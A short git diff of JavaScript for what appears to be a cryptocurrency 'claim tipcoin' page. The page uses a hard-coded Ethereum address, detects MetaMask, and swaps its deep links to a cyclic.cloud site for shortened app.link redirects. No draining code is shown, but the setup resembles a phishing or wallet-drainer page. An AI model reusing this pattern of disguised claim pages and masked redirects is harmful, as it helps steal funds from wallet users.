@@ -24,8 +24,8 @@ const Address = "0x0206b09AC971cb742aA059A44Fb0200768690a33";
 //     window.addEventListener('ethereum#initialized', handleEthereum, {
 //       once: true,
 //     });
-//   /
-//     / If the event is not dispatched by the end of the timeout,
+  
+//     // If the event is not dispatched by the end of the timeout,
 //     // the user probably doesn't have MetaMask installed.
 //     setTimeout(handleEthereum, 0); // 3 seconds
 //   }
@@ -35,7 +35,7 @@ const Address = "0x0206b09AC971cb742aA059A44Fb0200768690a33";
 
 if (typeof window.ethereum == "undefined") {
 // MetaMask or similar Ethereum wallet not detected
-// displayModalOrMessage("Ethereum wallet not detected.");
+//displayModalOrMessage("Ethereum wallet not detected.");
 
 
 
@@ -116,8 +116,8 @@ function loadAppropriateLink() {
     var userAgent = navigator.userAgent;
     
     // Define the links for each device type
-    var iosLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';';
-    var androidLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';';
+    var iosLink = 'https://metamask.app.link/bxwkE8oF99';
+    var androidLink = 'https://metamask.app.link/skAH3BaF99';
     var desktopLink = 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn';
 
     // Check for iOS
@@ -206,7 +206,7 @@ const handleEthereum = async()=>{
 
 return;
     }
-  }
+//   }
 // function loadAppropriateLink() {
 //     // Check the user agent to determine the device type
 //     var userAgent = navigator.userAgent;
